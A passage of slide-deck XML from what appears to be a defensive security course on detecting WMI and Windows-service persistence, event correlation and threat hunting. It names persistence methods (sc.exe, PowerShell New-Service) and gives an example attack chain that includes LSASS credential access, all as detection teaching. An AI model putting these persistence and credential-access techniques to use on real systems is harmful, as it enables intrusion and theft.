        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1410" name="Google Shape;1410;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293076" y="2055687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DETECTION_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1411" name="Google Shape;1411;p108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WMI: WINDOWS MANAGEMENT INSTRUMENTATION</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1412" name="Google Shape;1412;p108" title="Screenshot 2025-11-28 093020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18420" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546701" cy="3583201"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1413" name="Google Shape;1413;p108" title="Screenshot 2025-11-28 093020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27698" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940900" cy="4668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09"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2425725"/>
            <a:ext cx="1696200" cy="246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19" name="Google Shape;1419;p109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5397600" y="2425725"/>
            <a:ext cx="1696200" cy="246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20" name="Google Shape;1420;p109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195200" y="2425725"/>
            <a:ext cx="1696200" cy="246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21" name="Google Shape;1421;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2628375"/>
            <a:ext cx="1384800" cy="21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Run at startup automatically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Execute as SYSTEM by default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Survive reboots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Hard to detect without proper logging</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1422" name="Google Shape;1422;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2051338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WHY?_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1423" name="Google Shape;1423;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5511500" y="2628375"/>
            <a:ext cx="1384800" cy="21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sc.exe (Service Control)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Registry modification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PowerShell New-Service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WMI service creation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1424" name="Google Shape;1424;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5511500" y="2051338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ATK METHODS_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1425" name="Google Shape;1425;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293075" y="2628375"/>
            <a:ext cx="1461000" cy="21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Service creation events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Services from unusual paths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Services running scripts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Registry modifications</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1426" name="Google Shape;1426;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293076" y="2055687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DETECTION_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1427" name="Google Shape;1427;p109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WINDOWS SERVICES: ULTIMATE PERSISTENCE</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1428" name="Google Shape;1428;p109" title="Screenshot 2025-11-28 093520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3929" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="2546701" cy="3583202"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1429" name="Google Shape;1429;p109" title="Screenshot 2025-11-28 093520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14857" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280475" y="474638"/>
            <a:ext cx="2940899" cy="46688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10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="417225" y="1653300"/>
            <a:ext cx="50352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5900"/>
              <a:t>CORRELATION: CONNECTING THE DOTS</a:t>
            </a:r>
            <a:endParaRPr sz="5900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1435" name="Google Shape;1435;p110"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5864675" y="964950"/>
            <a:ext cx="2616600" cy="4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/>
              <a:t>Single Event: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/>
              <a:t>"PowerShell executed" → Maybe suspicious</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1436" name="Google Shape;1436;p110"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5864675" y="1489525"/>
            <a:ext cx="2291100" cy="33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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>Event Chain: </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="10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1. PowerShell downloaded file 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2. LSASS accessed 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3. Scheduled task created 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4. Lateral movement attempted → </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1000"/>
            </a:b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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>DEFINITELY SUSPICIOUS </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="10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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>Correlation Rule Structure: </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="10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/>
              <a:t>IF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t> Event A (within timeframe) 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/>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t> Event B (same user/host) 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/>
              <a:t>AND </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>Event C (related indicators) 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/>
              <a:t>THEN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t> High-confidence alert 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Space Grotesk"/>
                <a:ea typeface="Space Grotesk"/>
                <a:cs typeface="Space Grotesk"/>
                <a:sym typeface="Space Grotesk"/>
              </a:rPr>
              <a:t>Context = Confidence</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1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11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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Testing Pyramid_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1442" name="Google Shape;1442;p111" title="Screenshot 2025-11-28 094407.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="386" r="386" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1796888" y="581929"/>
            <a:ext cx="5550214" cy="4403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12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953300" y="1807850"/>
            <a:ext cx="3543900" cy="451200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="116500" lIns="116500" spcFirstLastPara="1" rIns="116500" wrap="square" tIns="11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2"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1911"/>
              <a:t>DETECTION (Reactive):</a:t>
            </a:r>
            <a:endParaRPr sz="1911"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1448" name="Google Shape;1448;p112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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THREAT HUNTING: PROACTIVE DEFENSE_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1449" name="Google Shape;1449;p112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646823" y="2192675"/>
            <a:ext cx="3435300" cy="1055400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="116500" lIns="116500" spcFirstLastPara="1" rIns="116500" wrap="square" tIns="116500">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>You actively search for threats </a:t>
            </a:r>
            <a:endParaRPr sz="1274"/>
          </a:p>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>Look for unknown patterns </a:t>
            </a:r>
            <a:endParaRPr sz="1274"/>
          </a:p>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>Assume breach mentality</a:t>
            </a:r>
            <a:endParaRPr sz="1274"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1450" name="Google Shape;1450;p112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646807" y="1807850"/>
            <a:ext cx="3543900" cy="451200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="116500" lIns="116500" spcFirstLastPara="1" rIns="116500" wrap="square" tIns="116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2"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1911"/>
              <a:t>HUNTING (Proactive):</a:t>
            </a:r>
            <a:endParaRPr sz="1911"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1451" name="Google Shape;1451;p112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="16" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953316" y="2192676"/>
            <a:ext cx="3435300" cy="1055400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="116500" lIns="116500" spcFirstLastPara="1" rIns="116500" wrap="square" tIns="116500">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>Alerts tell you something happened </a:t>
            </a:r>
            <a:endParaRPr sz="1274"/>
          </a:p>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>Rules wait for known patterns </a:t>
            </a:r>
            <a:endParaRPr sz="1274"/>
          </a:p>
          <a:p>
            <a:pPr indent="-372240" lvl="0" marL="58263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4"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1274"/>
              <a:t>Responds to triggers</a:t>
            </a:r>
            <a:endParaRPr sz="1274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6" name="Google Shape;1456;p113"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="536160" y="3292160"/>
            <a:ext cx="6698921" cy="1598929"/>
            <a:chOff x="243225" y="2826700"/>
            <a:chExt cx="8648233" cy="2064200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1457" name="Google Shape;1457;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="243225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58" name="Google Shape;1458;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3181192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59" name="Google Shape;1459;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6119158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60" name="Google Shape;1460;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="193335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61" name="Google Shape;1461;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="487140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62" name="Google Shape;1462;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7804025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463" name="Google Shape;1463;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630327" y="3524208"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>RESPONSE </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Escalate threats, create detections </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1464" name="Google Shape;1464;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630327" y="3206147"/>
            <a:ext cx="11835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 #4</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1465" name="Google Shape;1465;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2919661" y="3524208"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>LEARN</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Update knowledge, refine techniques</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1466" name="Google Shape;1466;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2919661" y="3206147"/>
            <a:ext cx="11835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 #5</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1467" name="Google Shape;1467;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5206662" y="3524210"/>
            <a:ext cx="18927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20"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>REPEAT</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1468" name="Google Shape;1468;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5206662" y="3206152"/>
            <a:ext cx="11991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 #6</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1469" name="Google Shape;1469;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="522925"/>
            <a:ext cx="67266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HUNTING METHODOLOGY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1470" name="Google Shape;1470;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="1758475"/>
            <a:ext cx="2100600" cy="94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rPr lang="en"/>
              <a:t>Hunting is iterative, not one-time</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1471" name="Google Shape;1471;p113"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2353210" y="1526423"/>
            <a:ext cx="6698921" cy="1598929"/>
            <a:chOff x="243225" y="2826700"/>
            <a:chExt cx="8648233" cy="2064200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1472" name="Google Shape;1472;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="243225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73" name="Google Shape;1473;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3181192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74" name="Google Shape;1474;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6119158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75" name="Google Shape;1475;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="193335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76" name="Google Shape;1476;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="487140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77" name="Google Shape;1477;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7804025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70825" lIns="70825" spcFirstLastPara="1" rIns="70825" wrap="square" tIns="7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4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478" name="Google Shape;1478;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2449702" y="1758470"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>HYPOTHESIS </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>"I think adversaries might be doing X"</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1479" name="Google Shape;1479;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2449702" y="1440410"/>
            <a:ext cx="11835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 #1</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1480" name="Google Shape;1480;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4736711" y="1758470"/>
            <a:ext cx="19146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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>INVESTIGATION </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Query data, analyze patterns</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1481" name="Google Shape;1481;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4736711" y="1440410"/>
            <a:ext cx="11835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 #2</a:t>
            </a:r>
            <a:endParaRPr sz="1161"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1482" name="Google Shape;1482;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7023712" y="1758473"/>
            <a:ext cx="1892700" cy="1261200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t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5"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>DISCOVERY </a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="620"/>
              </a:spcAft>
              <a:buSzPts val="775"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="774"/>
              <a:t>Find anomalies or confirm hypothesis</a:t>
            </a:r>
            <a:endParaRPr sz="774"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1483" name="Google Shape;1483;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7023712" y="1440415"/>
            <a:ext cx="1199100" cy="188100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="70825" lIns="70825" spcFirstLastPara="1" rIns="70825" wrap="square" tIns="708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62"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1161"/>
              <a:t>STEP #3</a:t>
            </a:r>
            <a:endParaRPr sz="116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8" name="Google Shape;1488;p114"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1917000"/>
            <a:ext cx="2846403" cy="3226550"/>
            <a:chOff x="0" y="1917000"/>
            <a:chExt cx="2846403" cy="3226550"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1489" name="Google Shape;1489;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="191700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90" name="Google Shape;1490;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="583203" y="219527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91" name="Google Shape;1491;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406231" y="2863118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92" name="Google Shape;1492;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="3709850"/>
              <a:ext cx="2263200" cy="1433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93" name="Google Shape;1493;p114"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406225" y="3904091"/>
